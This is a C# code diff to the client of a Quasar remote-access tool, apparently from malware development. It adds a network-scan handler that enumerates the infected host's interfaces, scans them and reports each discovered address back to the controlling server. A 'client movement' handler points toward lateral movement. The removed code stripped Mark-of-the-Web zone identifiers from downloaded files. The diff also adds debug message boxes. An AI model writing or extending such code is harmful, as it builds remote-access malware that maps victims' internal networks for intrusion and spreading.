@@ -1,6 +1,7 @@
 ﻿using Quasar.Client.Networking;
 using Quasar.Client.Setup;
 using Quasar.Client.Helper;
+using Quasar.Client.Helper.Network;
 using Quasar.Common;
 using Quasar.Common.Enums;
 using Quasar.Common.Helpers;
@@ -9,13 +10,14 @@ using Quasar.Common.Messages.other;
 using Quasar.Common.Messages.Network;
 using Quasar.Common.Networking;
 using System;
+using System.Collections.Generic;
 using System.ComponentModel;
 using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Reflection;
 using System.Threading;
-using System.Web.UI.WebControls;
+using System.Windows.Forms;
 
 namespace Quasar.Client.Messages
 {
@@ -30,7 +32,6 @@ namespace Quasar.Client.Messages
             _client = client;
             _client.ClientState += OnClientStateChange;
             _webClient = new WebClient { Proxy = null };
-            _webClient.DownloadFileCompleted += OnDownloadFileCompleted;
         }
 
         private void OnClientStateChange(Networking.Client s, bool connected)
@@ -40,19 +41,6 @@ namespace Quasar.Client.Messages
                 if (_webClient.IsBusy)
                     _webClient.CancelAsync();
             }
-        }
-
-        private void OnDownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
-        {
-            var message = e.UserState;
-            if (e.Cancelled)
-            {
-                NativeMethods.DeleteFile(message.FilePath);
-                return;
-            }
-
-            FileHelper.DeleteZoneIdentifier(message.FilePath);
-            //Call(message.FilePath, message.IsUpdate);
         }
 
         public bool CanExecute(IMessage message) => message is DoNetworkScan ||
@@ -83,7 +71,17 @@ namespace Quasar.Client.Messages
 
         private void Execute(ISender client, DoNetworkScan message)
         {
-
+            MessageBox.Show("Scanning interfaces...");
+            List<InterfaceEntity> interfaces = ScannerHelper.GetInterfaces();
+            MessageBox.Show($"Found {interfaces.Count} interfaces!");
+            foreach (InterfaceEntity nic in interfaces)
+            {
+                ScannerHelper.ScanInterfaceAction(nic, (addressEntity, nicEntity) =>
+                {
+                    _client.Send(new DoNetworkScanResponse { Result = true, FailureReason = "", Address = addressEntity, Interface = nicEntity });
+                    MessageBox.Show($"Added new network entity: {addressEntity.Address}");
+                });
+            }
         }
 
         private void Execute(ISender client, DoClientMovement message)
